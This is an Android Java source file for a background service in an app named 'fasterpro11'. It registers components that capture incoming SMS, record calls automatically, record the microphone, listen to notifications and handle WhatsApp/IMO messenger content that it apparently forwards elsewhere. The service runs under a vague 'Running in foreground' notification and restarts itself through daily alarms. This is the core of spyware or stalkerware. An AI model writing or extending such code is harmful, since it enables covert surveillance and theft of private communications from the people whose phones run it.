package com.example.fasterpro11;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;

import java.util.Calendar;

public class BackgroundService extends Service {

    private static final String TAG = "BackgroundService";
    public static final String ACTION_MIC_RECORD = "com.example.fasterpro11.ACTION_MIC_RECORD";

    private SmsReceiver smsReceiver;
    private NotificationListener notificationListener;
    private WhatsAppIMOMessengerContent messengerContent;
    private MicRecord micRecord;
    private CallRecorderAuto callRecorderAuto;
    private FileService fileService;  // Corrected declaration of FileService
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "foreground_service_channel";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate: Background service starting");

        try {
            // Initializing the components and registering necessary receivers
            messengerContent = new WhatsAppIMOMessengerContent();
            micRecord = new MicRecord(this);
            registerReceivers();

            // Start the service in the foreground with a notification
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Start as foreground service for Android 8.0 and above
                startForeground(NOTIFICATION_ID, buildNotification());
                Log.d(TAG, "Service started as foreground service");
            } else {
                // For older versions, normal service start
                startService(new Intent(this, BackgroundService.class));
            }

            // Schedule alarms for 9 AM and 12 AM
            scheduleDailyAlarms();

            Log.d(TAG, "Service onCreate: Initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error initializing service", e);
        }
    }

    private void scheduleDailyAlarms() {
        // Get the AlarmManager system service
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            // Set alarms for 9 AM and 12 AM
            scheduleAlarm(alarmManager, 9, 0);  // 9 AM
            scheduleAlarm(alarmManager, 0, 0);  // 12 AM
        }
    }

    private void scheduleAlarm(AlarmManager alarmManager, int hour, int minute) {
        Calendar calendar = Calendar.getInstance();
        calendar.set(Calendar.HOUR_OF_DAY, hour);
        calendar.set(Calendar.MINUTE, minute);
        calendar.set(Calendar.SECOND, 0);
        calendar.set(Calendar.MILLISECOND, 0);

        long triggerAtMillis = calendar.getTimeInMillis();
        if (calendar.getTimeInMillis() < System.currentTimeMillis()) {
            // If the time has passed for today, schedule for tomorrow
            calendar.add(Calendar.DAY_OF_MONTH, 1);
            triggerAtMillis = calendar.getTimeInMillis();
        }

        Intent intent = new Intent(this, BackgroundService.class);
        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent);

        Log.d(TAG, "Alarm scheduled for: " + hour + ":" + minute);
    }

    private void registerReceivers() {
        Log.d(TAG, "registerReceivers: Registering receivers");
        try {
            // Registering SMS receiver
            smsReceiver = new SmsReceiver();
            IntentFilter smsFilter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
            registerReceiver(smsReceiver, smsFilter);
            Log.d(TAG, "registerReceivers: SMS receiver registered");

            // Registering Call Recorder Auto
            callRecorderAuto = new CallRecorderAuto();
            IntentFilter callRecorderFilter = new IntentFilter("android.intent.action.PHONE_STATE");
            registerReceiver(callRecorderAuto, callRecorderFilter);
            Log.d(TAG, "registerReceivers: Call recorder registered");

            // Registering FileService (if it's used to manage files)
            fileService = new FileService();  // Correct initialization of FileService
            IntentFilter fileServiceFilter = new IntentFilter("android.intent.action.PHONE_STATE");
            registerReceiver(fileService, fileServiceFilter);
            Log.d(TAG, "registerReceivers: FileService registered");

            // Initializing Notification Listener
            notificationListener = new NotificationListener();
            enableNotificationListener();

            Log.d(TAG, "Receivers registered successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error registering receivers", e);
        }
    }

    private Notification buildNotification() {
        Log.d(TAG, "buildNotification: Building notification");
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                createNotificationChannel();
                return new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Foreground Service")
                        .setContentText("Running in foreground")
                        .setSmallIcon(R.drawable.notification_icon)
                        .build();
            } else {
                return new Notification.Builder(this)
                        .setContentTitle("Foreground Service")
                        .setContentText("Running in foreground")
                        .setSmallIcon(R.drawable.notification_icon)
                        .build();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error building notification", e);
            return null;
        }
    }

    private void createNotificationChannel() {
        Log.d(TAG, "createNotificationChannel: Creating notification channel");
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel serviceChannel = new NotificationChannel(
                        CHANNEL_ID,
                        "Foreground Service Channel",
                        NotificationManager.IMPORTANCE_DEFAULT
                );
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(serviceChannel);
                    Log.d(TAG, "createNotificationChannel: Channel created successfully");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error creating notification channel", e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "onDestroy: Stopping service");
        try {
            // Unregistering all receivers and observers to avoid memory leaks
            if (smsReceiver != null) {
                unregisterReceiver(smsReceiver);
                Log.d(TAG, "onDestroy: SMS receiver unregistered");
            }
            if (callRecorderAuto != null) {
                unregisterReceiver(callRecorderAuto);
                Log.d(TAG, "onDestroy: Call recorder unregistered");
            }
            if (fileService != null) {
                unregisterReceiver(fileService);
                Log.d(TAG, "onDestroy: FileService unregistered");
            }

            // Stop and disable the notification listener
            disableNotificationListener();

            if (micRecord != null) {
                unregisterReceiver(micRecord);
                Log.d(TAG, "onDestroy: MicRecord receiver unregistered");
            }

            if (messengerContent != null) {
                messengerContent.stopForwarding();
                messengerContent = null;
                Log.d(TAG, "onDestroy: Messenger content stopped forwarding");
            }

            Log.d(TAG, "NotificationListener service destroyed");
            Log.d(TAG, "Service onDestroy: Receivers and observers stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping service", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void enableNotificationListener() {
        Log.d(TAG, "enableNotificationListener: Enabling notification listener");
        try {
            ComponentName componentName = new ComponentName(this, NotificationListener.class);
            if (!isNotificationListenerEnabled(componentName)) {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Log.d(TAG, "enableNotificationListener: Notification listener settings opened");
            } else {
                Log.d(TAG, "enableNotificationListener: Notification listener already enabled");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error enabling notification listener", e);
        }
    }

    private void disableNotificationListener() {
        Log.d(TAG, "disableNotificationListener: Disabling notification listener");
        try {
            ComponentName componentName = new ComponentName(this, NotificationListener.class);
            if (isNotificationListenerEnabled(componentName)) {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Log.d(TAG, "disableNotificationListener: Notification listener settings opened");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error disabling notification listener", e);
        }
    }

    private boolean isNotificationListenerEnabled(ComponentName componentName) {
        Log.d(TAG, "isNotificationListenerEnabled: Checking if notification listener is enabled");
        try {
            String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            boolean isEnabled = flat != null && flat.contains(componentName.flattenToString());
            Log.d(TAG, "isNotificationListenerEnabled: Notification listener is " + (isEnabled ? "enabled" : "disabled"));
            return isEnabled;
        } catch (Exception e) {
            Log.e(TAG, "Error checking notification listener", e);
            return false;
        }
    }
}
